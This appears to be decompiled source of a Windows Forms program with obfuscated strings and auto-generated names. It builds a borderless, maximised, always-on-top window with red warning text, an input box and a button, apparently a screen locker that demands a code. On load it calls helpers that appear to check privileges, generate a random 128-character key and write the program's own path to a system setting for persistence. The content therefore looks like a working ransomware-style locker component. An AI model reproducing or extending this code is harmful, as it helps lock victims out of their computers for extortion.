using System;
using System.ComponentModel;
using System.Drawing;
using System.Windows.Forms;

namespace ns1;

public class GForm0 : Form
{
	private IContainer icontainer_0;

	private Panel panel_0;

	private Panel panel_1;

	private Panel panel_2;

	private PictureBox pictureBox_0;

	private Label label_0;

	private Label label_1;

	private Label label_2;

	private Label label_3;

	private Label label_4;

	private TextBox textBox_0;

	private Button button_0;

	protected override void Dispose(bool disposing)
	{
		if (disposing && icontainer_0 != null)
		{
			icontainer_0.Dispose();
		}
	}

	private void method_0()
	{
		//IL_0011: Unknown result type (might be due to invalid IL or missing references)
		//IL_001b: Expected O, but got Unknown
		//IL_001c: Unknown result type (might be due to invalid IL or missing references)
		//IL_0026: Expected O, but got Unknown
		//IL_0027: Unknown result type (might be due to invalid IL or missing references)
		//IL_0031: Expected O, but got Unknown
		//IL_0032: Unknown result type (might be due to invalid IL or missing references)
		//IL_003c: Expected O, but got Unknown
		//IL_003d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0047: Expected O, but got Unknown
		//IL_0048: Unknown result type (might be due to invalid IL or missing references)
		//IL_0052: Expected O, but got Unknown
		//IL_0053: Unknown result type (might be due to invalid IL or missing references)
		//IL_005d: Expected O, but got Unknown
		//IL_005e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0068: Expected O, but got Unknown
		//IL_0069: Unknown result type (might be due to invalid IL or missing references)
		//IL_0073: Expected O, but got Unknown
		//IL_0074: Unknown result type (might be due to invalid IL or missing references)
		//IL_007e: Expected O, but got Unknown
		//IL_007f: Unknown result type (might be due to invalid IL or missing references)
		//IL_0089: Expected O, but got Unknown
		//IL_01cc: Unknown result type (might be due to invalid IL or missing references)
		//IL_01d6: Expected O, but got Unknown
		//IL_026e: Unknown result type (might be due to invalid IL or missing references)
		//IL_0278: Expected O, but got Unknown
		//IL_0326: Unknown result type (might be due to invalid IL or missing references)
		//IL_0330: Expected O, but got Unknown
		//IL_03ce: Unknown result type (might be due to invalid IL or missing references)
		//IL_03d8: Expected O, but got Unknown
		//IL_062b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0635: Expected O, but got Unknown
		//IL_064b: Unknown result type (might be due to invalid IL or missing references)
		//IL_0655: Expected O, but got Unknown
		//IL_0677: Unknown result type (might be due to invalid IL or missing references)
		//IL_0681: Expected O, but got Unknown
		//IL_0701: Unknown result type (might be due to invalid IL or missing references)
		//IL_070b: Expected O, but got Unknown
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(GForm0));
		panel_0 = new Panel();
		label_1 = new Label();
		label_2 = new Label();
		label_3 = new Label();
		label_4 = new Label();
		panel_1 = new Panel();
		textBox_0 = new TextBox();
		button_0 = new Button();
		panel_2 = new Panel();
		pictureBox_0 = new PictureBox();
		label_0 = new Label();
		((Control)panel_0).SuspendLayout();
		((Control)panel_1).SuspendLayout();
		((Control)panel_2).SuspendLayout();
		((ISupportInitialize)pictureBox_0).BeginInit();
		((Control)this).SuspendLayout();
		((Control)panel_0).set_Anchor((AnchorStyles)0);
		((Control)panel_0).set_BackColor(Color.LightGray);
		((Control)panel_0).get_Controls().Add((Control)(object)label_1);
		((Control)panel_0).get_Controls().Add((Control)(object)label_2);
		((Control)panel_0).get_Controls().Add((Control)(object)label_3);
		((Control)panel_0).get_Controls().Add((Control)(object)label_4);
		((Control)panel_0).get_Controls().Add((Control)(object)panel_1);
		((Control)panel_0).get_Controls().Add((Control)(object)panel_2);
		((Control)panel_0).set_Location(new Point(104, 61));
		((Control)panel_0).set_Name(GClass0.smethod_0("vŤɪ\u0366Ѯ\u0530"));
		((Control)panel_0).set_Size(new Size(640, 480));
		((Control)panel_0).set_TabIndex(0);
		((Control)label_1).set_AutoSize(true);
		((Control)label_1).set_Font(new Font(GClass0.smethod_0("DŶɪ\u0363ѭ"), 8.25f, (FontStyle)1));
		((Control)label_1).set_Location(new Point(18, 315));
		((Control)label_1).set_Name(GClass0.smethod_0("jŤɦ\u0366ѮԴ"));
		((Control)label_1).set_Size(new Size(602, 70));
		((Control)label_1).set_TabIndex(5);
		((Control)label_1).set_Text(componentResourceManager.GetString(GClass0.smethod_0("gūɫ\u036dѫԳثݐࡦॺ\u0a75")));
		label_1.set_TextAlign((ContentAlignment)2);
		((Control)label_2).set_AutoSize(true);
		((Control)label_2).set_Font(new Font(GClass0.smethod_0("DŶɪ\u0363ѭ"), 8.75f, (FontStyle)1));
		((Control)label_2).set_ForeColor(Color.Red);
		((Control)label_2).set_Location(new Point(14, 223));
		((Control)label_2).set_Name(GClass0.smethod_0("jŤɦ\u0366ѮԵ"));
		((Control)label_2).set_Size(new Size(618, 75));
		((Control)label_2).set_TabIndex(4);
		((Control)label_2).set_Text(componentResourceManager.GetString(GClass0.smethod_0("gūɫ\u036dѫԲثݐࡦॺ\u0a75")));
		label_2.set_TextAlign((ContentAlignment)2);
		((Control)label_3).set_AutoSize(true);
		((Control)label_3).set_Font(new Font(GClass0.smethod_0("DŶɪ\u0363ѭ"), 8.25f, (FontStyle)1, (GraphicsUnit)3, (byte)204));
		((Control)label_3).set_Location(new Point(14, 149));
		((Control)label_3).set_Name(GClass0.smethod_0("jŤɦ\u0366ѮԲ"));
		((Control)label_3).set_Size(new Size(606, 56));
		((Control)label_3).set_TabIndex(3);
		((Control)label_3).set_Text(componentResourceManager.GetString(GClass0.smethod_0("gūɫ\u036dѫԵثݐࡦॺ\u0a75")));
		label_3.set_TextAlign((ContentAlignment)2);
		((Control)label_4).set_AutoSize(true);
		((Control)label_4).set_Font(new Font(GClass0.smethod_0("DŶɪ\u0363ѭ"), 9.75f, (FontStyle)1, (GraphicsUnit)3, (byte)204));
		((Control)label_4).set_ForeColor(Color.Red);
		((Control)label_4).set_Location(new Point(26, 88));
		((Control)label_4).set_Name(GClass0.smethod_0("jŤɦ\u0366ѮԳ"));
		((Control)label_4).set_Size(new Size(594, 48));
		((Control)label_4).set_TabIndex(2);
		((Control)label_4).set_Text(GClass0.smethod_0("Ҥ\u05a5ڢΕ\u0097Ɖ\u02f2\u0381ಈඒ\u0ee5\u0b8d\u089dৠઑ\u0b97\u1088ᖙᚗម႔ᇣዡ᎗ᲕᶢẠᮽᢤ᧚᪥\u1ba7⒣◛⚡➫₦↣⊯⎩ⲥ⦯⺼⾽⣄⦾⪹⮷エ㖽㚸㞹セ㇏㋌㏃㲵㴿㹎㭝㠽㵛㩅㬹䑆䔵䙎䝇䁊䅌䈲䍁䱂䵒乐佔䱌䵦习䬯呝啜嘪圫呈啃剒坁屘嵣幫彠塡奥幺彴恸敨昖杫怕慯扬挓氐楯湶歭桶極橵歱琈畹癴睵灹煻牷睡籼紏繼缈硼礃稊笂萆蔅舖蝴耊脇與荱谆负蹧輕衩贋詧謒鐝锛阓霘遦酨阂霬頪鴠鸫鼩頢饟騢鬢ꐠꔯꈺꌵꀩꄣꉓꌩ갫괷깁ꬭ꠴괫ꨙ\uab1c됑넪똙뜛뀤넞눜뜯"));
		label_4.set_TextAlign((ContentAlignment)2);
		((Control)panel_1).set_BackColor(Color.RoyalBlue);
		((Control)panel_1).get_Controls().Add((Control)(object)textBox_0);
		((Control)panel_1).get_Controls().Add((Control)(object)button_0);
		((Control)panel_1).set_Location(new Point(0, 409));
		((Control)panel_1).set_Name(GClass0.smethod_0("vŤɪ\u0366ѮԲ"));
		((Control)panel_1).set_Size(new Size(640, 71));
		((Control)panel_1).set_TabIndex(1);
		((Control)textBox_0).set_Location(new Point(272, 10));
		((Control)textBox_0).set_Name(GClass0.smethod_0("|Ţɾͱцլٺ\u0730"));
		((Control)textBox_0).set_Size(new Size(106, 20));
		((Control)textBox_0).set_TabIndex(1);
		((Control)button_0).set_Location(new Point(272, 36));
		((Control)button_0).set_Name(GClass0.smethod_0("eųɱͰѬլذ"));
		((Control)button_0).set_Size(new Size(106, 23));
		((Control)button_0).set_TabIndex(0);
		((Control)button_0).set_Text(GClass0.smethod_0("ЮԽػ\u073a1ķȲ\u033f\u0c46\u0d3b\u0e36༳ࡀ\u094d"));
		((ButtonBase)button_0).set_UseVisualStyleBackColor(true);
		((Control)panel_2).set_BackColor(Color.RoyalBlue);
		((Control)panel_2).get_Controls().Add((Control)(object)pictureBox_0);
		((Control)panel_2).get_Controls().Add((Control)(object)label_0);
		((Control)panel_2).set_Location(new Point(0, 0));
		((Control)panel_2).set_Name(GClass0.smethod_0("vŤɪ\u0366ѮԳ"));
		((Control)panel_2).set_Size(new Size(640, 85));
		((Control)panel_2).set_TabIndex(0);
		((Control)panel_2).add_Paint(new PaintEventHandler(panel_2_Paint));
		((Control)pictureBox_0).set_BackgroundImage((Image)componentResourceManager.GetObject(GClass0.smethod_0("kųɺ\u036cѢդ\u0670ݖ\u087c४ਠ\u0b3e\u0c4d൯\u0e6eཧ\u106cᅸቦ\u137dᑩᕢᙌᝩᡢᥥ\u1a64")));
		((Control)pictureBox_0).set_BackgroundImageLayout((ImageLayout)3);
		pictureBox_0.set_InitialImage((Image)componentResourceManager.GetObject(GClass0.smethod_0("hžɵ\u0361ѡաٷݓ\u087fॷ\u0a3fଣ\u0c45\u0d65\u0e63\u0f7dၡᅦቪፌᑩᕢᙥᝤ")));
		((Control)pictureBox_0).set_Location(new Point(282, 50));
		((Control)pictureBox_0).set_Name(GClass0.smethod_0("{ţɪͼѲմ٠\u0746\u086cॺਰ"));
		((Control)pictureBox_0).set_Size(new Size(74, 35));
		pictureBox_0.set_TabIndex(1);
		pictureBox_0.set_TabStop(false);
		((Control)label_0).set_AutoSize(true);
		((Control)label_0).set_Font(new Font(GClass0.smethod_0("JŸɠ\u0369ѫԦهݨࡢॡ੪"), 12f, (FontStyle)1, (GraphicsUnit)3, (byte)204));
		((Control)label_0).set_ForeColor(Color.White);
		((Control)label_0).set_Location(new Point(201, 0));
		((Control)label_0).set_Name(GClass0.smethod_0("jŤɦ\u0366Ѯ\u0530"));
		((Control)label_0).set_Size(new Size(238, 46));
		((Control)label_0).set_TabIndex(0);
		((Control)label_0).set_Text(GClass0.smethod_0("иԛ؟ܙaŝȫ\u035d\u0c5d൙ศ༧కഝਤନᑗᕑᙒᜤ\u102dᄲሶፈᠬᴿḿἲ\u1c28\u1924ᨼᭅ\u2434┻☿❊"));
		label_0.set_TextAlign((ContentAlignment)2);
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Control)this).set_BackColor(SystemColors.GradientInactiveCaption);
		((Form)this).set_ClientSize(new Size(853, 577));
		((Control)this).get_Controls().Add((Control)(object)panel_0);
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Control)this).set_Name(GClass0.smethod_0("Cūɱ\u036fа"));
		((Form)this).set_TopMost(true);
		((Form)this).set_WindowState((FormWindowState)2);
		((Form)this).add_Load((EventHandler)GForm0_Load);
		((Control)panel_0).ResumeLayout(false);
		((Control)panel_0).PerformLayout();
		((Control)panel_1).ResumeLayout(false);
		((Control)panel_1).PerformLayout();
		((Control)panel_2).ResumeLayout(false);
		((Control)panel_2).PerformLayout();
		((ISupportInitialize)pictureBox_0).EndInit();
		((Control)this).ResumeLayout(false);
	}

	public GForm0()
	{
		method_0();
	}

	private void GForm0_Load(object sender, EventArgs e)
	{
		Class4 @class = new Class4();
		@class.method_0(GClass0.smethod_0("fźɤ"), GClass0.smethod_0("/"), GClass0.smethod_0("mſɶ\u0369ѫձ٧ݳ"));
		Class5 class2 = new Class5();
		if (class2.method_0())
		{
			class2.method_1(GClass0.smethod_0("sŧɶ\u036fѮեٳ"), bool_1: true, GClass0.smethod_0("fźɤ"), Environment.GetFolderPath(Environment.SpecialFolder.System));
		}
		Class2 class3 = new Class2();
		Class1 class4 = new Class1();
		Class7 class5 = new Class7();
		if (DateTime.Now.Minute < 999)
		{
			class4.method_1(GClass0.smethod_0("]ŢɪͿѽըٺݢ\u085a\u0948੭ୠ\u0c70൮"), class3.method_0(), GClass0.smethod_0("gźɽͿь՟١ݡࡥ२\u0a63୬౻൛๕\u0f7cၷᅷቧ፬"), GClass0.smethod_0("."), class5.method_0(128), GClass0.smethod_0("0"));
			class4.method_1(GClass0.smethod_0("]ŢɪͿѽըٺݢ\u085a\u0948੭ୠ\u0c70൮"), class3.method_0(), GClass0.smethod_0("zšɨ\u0368љՖٶݬ\u085d"), GClass0.smethod_0("."), GClass0.smethod_0("użɷ\u0368ѧճ"), Application.get_ExecutablePath());
		}
	}

	private void panel_2_Paint(object sender, PaintEventArgs e)
	{
	}
}
